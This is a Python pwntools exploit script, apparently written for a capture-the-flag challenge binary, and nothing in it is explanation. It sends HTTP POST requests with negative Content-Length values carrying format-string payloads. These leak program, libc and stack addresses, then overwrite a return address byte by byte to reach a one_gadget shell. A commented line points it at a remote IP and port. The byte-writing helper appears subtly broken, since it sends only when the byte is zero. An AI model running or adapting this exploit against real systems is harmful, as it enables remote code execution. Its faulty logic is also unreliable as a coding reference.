from pwn import *
context.log_level = 'debug'
context.binary = ELF("./chall")
e = ELF("./chall")
libc = ELF("./libc-2.27.so")
one_gadget = 0x10a45c
p = process(["./ld-2.27.so", "./chall"], env={"LD_PRELOAD": "./libc-2.27.so"})
# p = remote("47.105.94.48", 12435)
payload = "POST /k HTTP/1.0\nContent-Length:-12\n\r\n{}\r\n"
payload1 = "POST /k HTTP/1.0\nContent-Length:-12\n\r\n%15$p\r\n"
p.sendafter('> ', payload1)
e.address = int(p.recvuntil('\r\n', drop=True), 16) - 0x14A8
payload2 = b"POST /k HTTP/1.0\nContent-Length:-12\n\r\n%23$s\r\naaaaaaaaaaa" + p64(e.got['atoi'])
p.sendafter('> ', payload2)
libc.address = u64(p.recvuntil('\r\naaaaaaaaaaa', drop=True).ljust(8, b'\x00')) - libc.symbols['atoi']
print(hex(e.got['strchr']))
print("libc=>", hex(libc.address))
# gdb.attach(p)
payload3 = b"POST /k HTTP/1.0\nContent-Length:-12\n\r\n%14$s\r\naaaaaaaaaaa"
p.sendafter('> ', payload3)
stack_address = u64(p.recvuntil('\r\n', drop=True).ljust(8, b'\x00')) + 8
print("hex(stack_address)", hex(stack_address))


def write_byte(addr, num):
    if num == 0:
        num = 256
        _payload = "POST /k HTTP/1.0\nContent-Length:-12\n\r\n%{}c%23$hhn\r\n".format(
            num).ljust(56, 'a').encode() + p64(addr)
        p.sendafter('> ', _payload)


ret_addr = 0x1634 + e.address
# for i in range(0):
for i in range(8):
    cur_num = (ret_addr >> (i * 8)) % 256
    write_byte(stack_address + i, cur_num)
    stack_address += 8
one_gadget = one_gadget + libc.address
for i in range(8):
    cur_num = (one_gadget >> (i * 8)) % 256
    if cur_num == 0:
        continue
    write_byte(stack_address + i, cur_num)
for i in range(8):
    write_byte(stack_address + i + 0x78, 0)
p.send('a')
p.interactive()
if __name__ == '__main__':
    pass
